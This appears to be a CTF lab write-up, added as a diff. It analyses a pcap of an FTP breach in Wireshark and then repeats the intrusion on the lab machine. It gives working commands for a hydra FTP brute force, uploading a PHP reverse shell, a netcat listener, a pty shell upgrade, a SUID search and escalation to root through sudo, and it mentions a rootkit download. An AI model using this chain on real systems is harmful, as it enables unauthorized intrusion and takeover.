@@ -1,0 +1,121 @@
+So this room was FUN i like this room!
+
+So the main senario is that a company/machine has been hacked and we have got the
+.pcap files  of the attack which we have to analyse using wireshark! So lets jump in it and read the file to read .pcapfile type
+
+wireshark wireshark Capture.pcapng
+
+so just go through the  requests and you will see FTP Protocols and there you can see some data which can be read like
+
+right click on the file > follow > tcp stream/ http stream
+
+you can see there is a username "jenny" and some passwords 
+after going through some of the files we can consider that the attacker used
+bruteforcing in ftp to get the password ("password123")
+
+after some of the requests we can see that the attacker got into the ftp and the working directory is /var/www/html
+
+
+and he uploaded a shell named shell.php 
+
+he downloaded the php-rev shell from : http://pentestmonkey.net/tools/php-reverse-shell
+
+and changed its perms to 777
+
+go through all the files we see there is a connection through the http protocol!
+the attacker uploaded the file in ftp and accessed it from the website 
+
+http://ipaddress/shell.php  <------ like this
+
+after going through some more packets we see that the attacker got a shell in the website and is connected to the webshell with used www-data
+
+used python3 -c 'import pty; pty.spawn("/bin/bash")' to get a stable shell 
+
+he just guessed that jenny password for machine could be also password123 like ftp 
+and his guess was correct 
+
+the computer's host name was : wir3
+
+he did sudo -l to check what perms he have and he can become root as he have sudo perms
+
+(ALL : ALL) ALL
+
+sudo su
+
+after becoming root he downlaoded a rootkit from github 
+
+git clone https://github.com/f0rb1dd3n/Reptile.git
+
+
+and used make command to make it and! run it to get a stleathy backdoor!
+
+===========================
+
+
+Now its our turn to trace back his steps and hack back into the machine!
+
+
+first we will bruteforce the ftp with user jenny and password list rockyou.txt
+
+hydra -l jenny -P rockyou.txt $ip ftp -Vv -t15 -I
+
+-Vv : for verbosity
+-I : to ignore older files of the bruteforce 
+-t : to use 15 threads for the process(you can also increase the process upto 64)
+
+we get the password as : 987654321
+
+enters the ftp and upload the shell downloaded from : http://pentestmonkey.net/tools/php-reverse-shell
+
+remeber to change the ip and port in the webshell to you tryhackme ip and port to any other
+
+enter the ftp and upload the file
+
+put webshell.php
+
+now change the permissions of the file so that server can execute the file!
+
+chmod 777 webshell.php
+
+now start a rev connection netcat listener on other terminal
+
+nc -lvnp port
+
+port: enter the port number you entered in the webshell.php file
+
+now execute the web shell by browsing to the webshell through the browser
+
+http://$ip/webshellname.php
+
+this will give a rev connection on your terminal! after that
+
+i tried to make a stable shell by this
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+now when you will type sudo -l 
+
+you will be asked for www-data! 
+
+tried to find suid files but that didnt worked
+
+find / -type f -perm -u=s 2>/dev/null
+
+
+after alot of thinking i though that attacker used the same password used in ftp to login as the used jenny
+
+i did that too
+
+su jenny
+987654321
+
+i became the jenny user after that i tried sudo -l
+
+and jenny still have perms to become sudo by sudo su
+
+and i became the root! and got the flag saved in the /root/ dir inside the reptile directory ! 
+
+					CONGRATS!
+
+
